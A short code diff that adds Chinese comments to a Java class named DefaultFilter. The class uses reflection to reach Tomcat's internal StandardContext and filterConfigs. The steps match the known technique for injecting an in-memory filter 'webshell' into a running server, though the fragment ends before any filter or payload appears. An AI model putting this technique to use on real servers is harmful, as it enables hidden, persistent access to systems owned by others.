@@ -53,12 +53,13 @@ class DefaultFilter implements Filter {
 String name = "DefaultFilter";
 
 ServletContext servletContext =  request.getSession().getServletContext();
-
+//获取ApplicationContext
 Field appctx = servletContext.getClass().getDeclaredField("context"); 
 appctx.setAccessible(true);
 ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext); 
 Field stdctx = applicationContext.getClass().getDeclaredField("context");
 stdctx.setAccessible(true);
+//获取StandardContext
 StandardContext standardContext = (StandardContext) stdctx.get(applicationContext); 
 Field Configs = standardContext.getClass().getDeclaredField("filterConfigs");
 Configs.setAccessible(true);
